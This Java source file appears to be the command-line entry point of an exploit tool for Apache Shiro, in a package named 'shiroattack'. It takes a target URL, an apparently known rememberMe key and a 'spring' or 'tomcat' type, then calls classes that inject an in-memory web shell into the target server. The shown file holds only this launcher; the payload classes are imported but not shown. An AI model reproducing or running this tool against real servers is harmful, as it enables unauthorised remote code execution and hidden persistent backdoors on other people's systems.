package com.govuln.shiroattack;

import com.govuln.shiroattack.memshell.Client_memshell_spring;
import com.govuln.shiroattack.memshell.Client_memshell_tomcat;


public class Main {
    public static void main(String[] args) {
        String url, key,type;
        if (args.length != 3) {
            System.out.println("java -jar xxx.jar url key type(spring/tomcat)");
            return;
        } else {
            url = args[0];
            key = args[1];
            type = args[2];
            System.out.println("url: " + url);
            System.out.println("key: " + key);
            System.out.println("type: " + type);
        }
        try {
                exp(url, key,type);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void exp(String url, String key,String type) throws Exception {
        if (type.contains("spring")){
            Client_memshell_spring.main(url, key);
        }else {
        Client_memshell_tomcat.main(url, key);
        }
    }
}
